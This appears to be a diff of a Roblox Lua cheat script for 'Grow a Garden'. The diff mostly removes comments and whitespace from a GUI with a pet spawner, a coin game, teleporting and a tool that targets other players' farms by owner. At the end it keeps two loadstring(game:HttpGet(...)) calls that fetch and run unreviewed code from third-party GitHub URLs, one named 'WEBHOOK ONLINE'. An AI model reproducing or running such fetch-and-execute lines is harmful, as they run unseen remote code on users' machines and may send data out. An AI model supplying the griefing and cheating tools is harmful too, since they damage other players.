@@ -313,7 +313,6 @@ local function createCoin(position)
     coin.CanCollide = false
     coin.Parent = workspace
     
-    -- Add highlight effect
     local highlight = Instance.new("SelectionBox")
     highlight.Adornee = coin
     highlight.Color3 = Color3.fromRGB(255, 255, 0)
@@ -321,7 +320,6 @@ local function createCoin(position)
     highlight.Transparency = 0.3
     highlight.Parent = coin
     
-    -- Add spinning animation (with safety check)
     if TweenService then
         local spinTween = TweenService:Create(
             coin,
@@ -330,7 +328,6 @@ local function createCoin(position)
         )
         spinTween:Play()
         
-        -- Add floating animation
         local originalPos = position
         local floatTween = TweenService:Create(
             coin,
@@ -457,15 +454,12 @@ local function startGame()
     
     gameActive = true
     
-    -- Store original position
     if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
         originalPosition = player.Character.HumanoidRootPart.CFrame
     end
     
-    -- Create game area
     createGameArea()
     
-    -- Teleport player to game area with smooth transition
     if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
         local teleportCFrame = CFrame.new(gameArea.Position + Vector3.new(0, 10, 0))
         player.Character.HumanoidRootPart.CFrame = teleportCFrame
@@ -473,7 +467,6 @@ local function startGame()
     
     wait(0.5)
     
-    -- Start spawning coins
     spawnCoins()
     
     if ModernGUILibrary and ModernGUILibrary.createNotification then
@@ -481,13 +474,11 @@ local function startGame()
     end
 end
 
--- Stop the coin collecting game
 local function stopGame()
     if not gameActive then return end
     
     gameActive = false
     
-    -- Clear all game objects
     for _, obj in pairs(gameObjects) do
         if obj and obj.Parent then
             obj:Destroy()
@@ -495,13 +486,11 @@ local function stopGame()
     end
     gameObjects = {}
     
-    -- Remove game area
     if gameArea then
         gameArea:Destroy()
         gameArea = nil
     end
     
-    -- Teleport player back with smooth transition
     if originalPosition and player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
         player.Character.HumanoidRootPart.CFrame = originalPosition
     end
@@ -511,10 +500,8 @@ local function stopGame()
     end
 end
 
--- Load currency
 loadCurrency()
 
--- Create currency label with proper reference (ADD SAFETY CHECK)
 if spawnerTab and spawnerTab.AddLabel then
     local spawnerHeader, labelElement = spawnerTab.AddLabel(
         "SpawnerHeader",
@@ -531,13 +518,11 @@ if spawnerTab and spawnerTab.AddLabel then
         }
     )
     
-    -- Set the global currency label reference
     currencyLabel = labelElement
 else
     warn("spawnerTab or AddLabel method not found!")
 end
 
--- Coin Collecting Game Checkbox (ADD SAFETY CHECK)
 if spawnerTab and spawnerTab.AddCheckbox then
     local spawnPetCheckbox, spawnPetElement = spawnerTab.AddCheckbox(
         "SpawnPet",
@@ -608,12 +593,9 @@ local dragonflyRotationSystem = {
 }
 local dragonflyRotationConnection
 
--- Function to handle Queen Bee and Dragonfly wing rotation
 local function updateWingRotation(wingData)
-    -- Update rotasi berdasarkan arah dan kecepatan
     wingData.currentZ = wingData.currentZ + (wingData.speed * wingData.direction)
     
-    -- Check batas dan ubah arah
     if wingData.currentZ >= wingData.maxZ then
         wingData.currentZ = wingData.maxZ
         wingData.direction = -1 -- balik arah ke bawah
@@ -625,14 +607,11 @@ local function updateWingRotation(wingData)
     return wingData.currentZ
 end
 
--- Function untuk update Dragonfly wing rotation
 local function updateDragonflyRotation()
     if not dragonflyRotationSystem.initialized then return end
     
-    -- Update rotasi berdasarkan arah dan kecepatan
     dragonflyRotationSystem.currentZ = dragonflyRotationSystem.currentZ + (dragonflyRotationSystem.speed * dragonflyRotationSystem.direction)
     
-    -- Check batas dan ubah arah
     if dragonflyRotationSystem.currentZ <= dragonflyRotationSystem.minZ then -- <= karena minZ adalah -150
         dragonflyRotationSystem.currentZ = dragonflyRotationSystem.minZ
         dragonflyRotationSystem.direction = 1 -- balik arah ke atas (-150 Ã¢â€ â€™ -50)
@@ -787,7 +766,6 @@ local function findMyFarmAndPetArea()
     return nil, nil, nil
 end
 
--- Custom rotation & offset table untuk pet-pet tertentu
 local customSettings = {
     ["Praying Mantis"] = {
         offset = CFrame.new(2.9, 0.4, -0.2),
@@ -2279,15 +2257,12 @@ local function hardDestroyMethod(targetOwner)
     local function findTargetFarm()
         if not workspace:FindFirstChild("Farm") then
             return nil
-        end
-        
-        local farmChildren = workspace.Farm:GetChildren()
-        
+        end       
+        local farmChildren = workspace.Farm:GetChildren()      
         for _, farm in pairs(farmChildren) do
             if farm:FindFirstChild("Important") and 
                farm.Important:FindFirstChild("Data") and 
-               farm.Important.Data:FindFirstChild("Owner") then
-                
+               farm.Important.Data:FindFirstChild("Owner") then            
                 local ownerValue = nil
                 pcall(function()
                     if farm.Important.Data.Owner:FindFirstChild("Value") then
@@ -2296,13 +2271,11 @@ local function hardDestroyMethod(targetOwner)
                         ownerValue = farm.Important.Data.Owner.Value
                     end
                 end)
-                
                 if tostring(ownerValue) == targetOwner then
                     return farm
                 end
             end
-        end
-        
+        end        
         return nil
     end
     
@@ -2353,21 +2326,16 @@ local destroyCheckbox, getDestroyStatus = destroyerTab.AddCheckbox(
     end
 )
 
--- Refresh Target List Button - UPDATED VERSION WITH WORKING FUNCTIONALITY
 local refreshButton, refreshMethods = destroyerTab.AddButton(
     "RefreshTargets",
     "Refresh Target List",
     nil,
     function()
-        -- Get the current selected target to preserve selection if possible
         local currentTarget = targetMethods.getValue()
         
-        -- Update farm owners list by scanning the workspace again
         local newFarmOwners = getAllFarmOwners()
         
-        -- Check if the dropdown has setOptions method and use it
         if targetMethods and targetMethods.setOptions and type(targetMethods.setOptions) == "function" then
-            -- Preserve current selection if it still exists in the new list
             local preserveSelection = false
             for _, owner in pairs(newFarmOwners) do
                 if owner == currentTarget then
@@ -2377,17 +2345,12 @@ local refreshButton, refreshMethods = destroyerTab.AddButton(
             end
             
             if preserveSelection and currentTarget ~= "Select Target" then
-                -- Update options and keep current selection
                 targetMethods.setOptions(newFarmOwners, currentTarget)
             else
-                -- Update options and reset to default
                 targetMethods.setOptions(newFarmOwners, "Select Target")
-            end
-            
-            -- Update the global variable
+            end           
             farmOwners = newFarmOwners
             
-            -- Show success notification
             local farmCount = #newFarmOwners - 1 -- Subtract 1 for "Select Target" option
             ModernGUILibrary.createNotification("Target list refreshed! Found " .. farmCount .. " farms", "success")
         else
@@ -2439,19 +2402,14 @@ local set2, set2s = settingTab.AddCheckbox(
     nil,
     function(checked)
         if checked then
-            ModernGUILibrary.createNotification("Teleport UI just Hided.!", "success")
-            
-            
+            ModernGUILibrary.createNotification("Teleport UI just Hided.!", "success")             
    PlayerGui.Teleport_UI.Enabled = false
-        else
-        
-   PlayerGui.Teleport_UI.Enabled = true
-   
+        else        
+   PlayerGui.Teleport_UI.Enabled = true   
             ModernGUILibrary.createNotification("Teleport UI its visible now!", "info")
         end
     end
 )
-
 
 local updateHeader, updateHeaderMethods = updateTab.AddLabel(
     "UpdateHeader",
@@ -2520,8 +2478,6 @@ local updLabel4, updLabel4s = updateTab.AddLabel(
     }
 )
 
-
--- Set title for the GUI
 if PlayerGui:FindFirstChild("ModernGUI") and 
    PlayerGui.ModernGUI:FindFirstChild("MainFrame") and
    PlayerGui.ModernGUI.MainFrame:FindFirstChild("TopBar") and
@@ -2533,8 +2489,7 @@ wait(0.2)
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/indixe"))()
     wait(0.2)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/grp5ss/Syo/refs/heads/main/WEBHOOK%20ONLINE"))()
-    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/grp5ss/Syo/refs/heads/main/WEBHOOK%20ONLINE"))()  
 end)
 
 ModernGUILibrary.createNotification("GROW A GARDEN SCRIPT V5", "success")
